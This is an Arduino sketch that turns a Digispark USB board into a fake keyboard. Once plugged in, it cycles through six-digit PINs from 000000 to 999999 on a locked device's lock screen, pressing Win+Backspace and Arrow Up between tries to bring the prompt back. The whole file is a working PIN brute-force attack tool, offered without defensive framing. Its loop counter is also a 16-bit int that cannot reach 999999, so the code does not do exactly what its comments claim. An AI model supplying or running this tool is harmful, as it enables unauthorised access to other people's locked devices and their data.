#include <DigiKeyboard.h>

#define KEY_BACKSPACE 0x2A  // HID keycode for Backspace
#define KEY_UP        0x52  // HID keycode for Arrow Up

#define ATTEMPT_DELAY     2000        // Delay between attempts (in milliseconds)
#define KEYSTROKE_DELAY   200         // Delay between each digit keystroke (in milliseconds)
#define USE_ENTER         false       // Whether to press Enter after the PIN (not used here)

#define LED_PIN           1           // P1 is usually the built-in LED on Digispark

/**
 * Sends a given PIN as keystrokes via DigiKeyboard, simulating user input.
 * After typing the PIN, it sends Windows + Backspace and then Arrow Up to return
 * to the home screen and bring up the PIN entry interface again.
 */
void typePin(const char* pin) {
  digitalWrite(LED_PIN, HIGH);                // Turn on LED to indicate typing
  DigiKeyboard.sendKeyStroke(0);              // Clear any modifiers

  for (byte i = 0; pin[i] != '\0'; i++) {
    DigiKeyboard.print(pin[i]);               // Send each digit
    DigiKeyboard.delay(KEYSTROKE_DELAY);      // Delay between digits
  }

  if (USE_ENTER) {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);    // Optional Enter
  }

  // Return to home screen with Win + Backspace
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Simulate swipe up (Arrow Up)
  DigiKeyboard.sendKeyStroke(KEY_UP);

  digitalWrite(LED_PIN, LOW);                 // Turn off LED
  DigiKeyboard.delay(ATTEMPT_DELAY);          // Delay before next attempt
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  DigiKeyboard.delay(1000); // Short initial delay after plug-in

  // Optional: one-time reset to home screen and swipe up before starting
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_UP);
  DigiKeyboard.delay(2000);

  // Start brute force from 000000 to 999999
  char pin[7]; // 6 digits + null terminator
  for (int i = 0; i <= 999999; i++) {
    sprintf(pin, "%06d", i); // Format as 6-digit string with leading zeros
    typePin(pin);
  }
}

void loop() {
  // Nothing happens in loop
}
